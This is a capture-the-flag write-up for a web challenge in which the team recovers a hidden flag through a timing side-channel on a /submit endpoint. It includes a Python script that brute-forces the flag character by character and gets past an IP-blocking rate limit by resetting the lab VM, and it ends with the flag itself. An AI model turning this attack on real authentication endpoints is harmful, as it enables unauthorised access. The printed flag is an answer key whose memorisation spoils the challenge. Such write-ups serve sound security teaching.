# Huntress CTF 2025 -- 🌐 Flag Checker

- **Team:** r4ph3cks
- **Date:** 01/10/2025

## Challenge Information

- **Category:** 🌐 Web

- **Description:**
> We've decided to make this challenge really straight forward. All you have to do is find out the flag!
>
> Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...

- **Author:** [Soups71](https://github.com/Soups71)

## Analysis and Solution

We were given a virtual machine to launch, that after starting completion, showed this html page:

![Site Preview](images/site_preview.png)

We were not given any source code of the page. We tried checking html, scripts and networks requests and realized that the possible attack vector was sending requests to a endpoint ```/submit```. This endpoint is used to send what the user inputs in the text box and sends it like ```/submit?flag=flag{this_flag_is_cool}``` with a GET method.

After testing command injection and other techinques, we tried an attack using timing responses. We tought of this because of the message below the text box, ```Brute forcing won't work, we got a new security team.```. Usually, this is not an attack that is common in CTF's but it was worth the try.

We started by sending a char to see the response time, like ```/submit?flag=a```. At first we didn't realized that there were a ```x-response-time``` header in the response. This is important because this header is manually sent by the server, and is not the browser that puts it. So this is the "precise" time calculated by the server, and if the network has any noise or failures, that header is the precise time and not the calculated by the browser. So sending the request we got this:

![Site Negative Response](images/response.png)

![Simple Request Headers](images/simple_request_headers.png)

The last header tells us that the response time calculated by the server is ```0.001048 seconds```. If we try to send ```flag{``` we should have a higher response time:

![Flag Start Headers](images/flag_start_headers.png)

There is a different response time. So if we start sending characters after ```flag{``` we should be able to see differents between the response times of the characters. The flags are MD5 hashes so the length is 32 inside the ```{}``` and the possible characters are ```0123456789abcdef```. Unfortunally we realized that, after 11 requests, our IP is blacklisted, forbidding us to send more requests:

![IP Blocked](images/blocked_ip.png)

So we only could get to the character ```a```. We can resolve this in the simplest way by resetting the VM and getting a new url and continue the testing. For this we made a python script:

```python
import requests

MD5_CHARSET = '0123456789abcdef'
TARGET_LENGTH = 37; # flag{32 char hash}
FLAG = "flag{"
URL = ""
REQUESTS_TIMES = []
MAX_TRIES = 11

def make_requests(char):
    print(f'TRYING CHAR: ' + char)
    response = requests.get("http://" + URL + "/submit?flag=" + FLAG + char)
    if (response.status_code == 200):
        elapsedTime = response.headers.get("x-response-time")
        print(f'Request done with response time: ' + elapsedTime)
        REQUESTS_TIMES.append(elapsedTime)
    else:
        print(f'An error occured when sending request to {URL}')

if __name__ == '__main__':
    left_requests = 0

    while len(FLAG) < TARGET_LENGTH:
        print(f'FLAG LENGTH {len(FLAG) - 4}')
        for char in MD5_CHARSET:
            if left_requests == 0:
                URL = input('URL: ').strip()
                if not URL:
                    print("Invalid URL. Try again.")
                    left_requests = 0
                    while not URL:
                        URL = input('URL: ').strip()
                left_requests = MAX_TRIES

            make_requests(char)

            left_requests -= 1

        most_elapsed_time = max(REQUESTS_TIMES)
        most_elapsed_char = MD5_CHARSET.__getitem__(REQUESTS_TIMES.index(most_elapsed_time))

        FLAG = FLAG + most_elapsed_char
        print(f'Got char: {most_elapsed_char}. Flag: {FLAG}')

        REQUESTS_TIMES = []

    print(f'Final FLAG: {FLAG}')
```

This scripts iterates every char possible for the flag requesting a URL when all the tries are tried. This probably could be done in a simpler way but we sticked with this. 

When executing we could check that when a character is the right one, there is a ```0.1``` diff between the other requests. By doing this for a good amount of time ;) we found the flag:

### Flag:

```
flag{77ba0346d9565e77344b9fe40ecf1369}
```
